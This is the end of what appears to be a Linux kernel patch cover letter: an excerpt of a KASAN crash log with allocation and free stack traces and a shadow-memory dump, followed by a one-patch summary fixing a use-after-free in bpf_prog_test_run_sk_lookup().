[  735.719119][T27286] page last allocated via order 3, migratetype Unmovable, 0
[  735.721094][T27286]  post_alloc_hook+0xe6/0x100
[  735.721596][T27286]  get_page_from_freelist+0x55c/0x2210
[  735.722126][T27286]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[  735.722791][T27286]  new_slab+0xa2/0x5f0
[  735.723188][T27286]  refill_objects+0xe3/0x430
[  735.723638][T27286]  __pcs_replace_empty_main+0x2ed/0x650
[  735.724161][T27286]  kmem_cache_alloc_noprof+0x559/0x6d0
[  735.724686][T27286]  sk_prot_alloc+0x4a/0x1f0
[  735.725098][T27286]  sk_alloc+0x36/0xa60
[  735.725447][T27286]  inet_create+0x286/0xa50
[  735.725880][T27286]  __sock_create+0x2c8/0x6e0
[  735.726299][T27286]  __sys_socket+0x122/0x210
[  735.726776][T27286]  __x64_sys_socket+0x40/0x50
[  735.727254][T27286]  do_syscall_64+0x116/0x800
[  735.727737][T27286]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  735.728313][T27286] page last free pid 5334 tgid 5334 stack trace:
[  735.728940][T27286]  register_dummy_stack+0x89/0xd0
[  735.729443][T27286]  init_page_owner+0x48/0x940
[  735.730035][T27286]  page_ext_init+0x53e/0x800
[  735.730511][T27286]  mm_core_init+0x142/0x220
[  735.730966][T27286] 
[  735.731206][T27286] Memory state around the buggy address:
[  735.731729][T27286]  ffff88817789c300: 00 00 00 00 00 00 00 00 00 00 00 00 00
[  735.732434][T27286]  ffff88817789c380: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  735.733208][T27286] >ffff88817789c400: fa fb fb fb fb fb fb fb fb fb fb fb fb
[  735.733988][T27286]                          ^
[  735.734439][T27286]  ffff88817789c480: fb fb fb fb fb fb fb fb fb fb fb fb fb
[  735.735201][T27286]  ffff88817789c500: fb fb fb fb fb fb fb fb fb fb fb fb fb
[  735.735972][T27286] =========================================================


-----END crash log-----

Best regards,
Luxiao Xu
Ren Wei


Luxiao Xu (1):
  bpf: Fix use-after-free in bpf_prog_test_run_sk_lookup()

 net/bpf/test_run.c | 20 ++++++++++----------
 1 file changed, 10 insertions(+), 10 deletions(-)

-- 
2.43.0

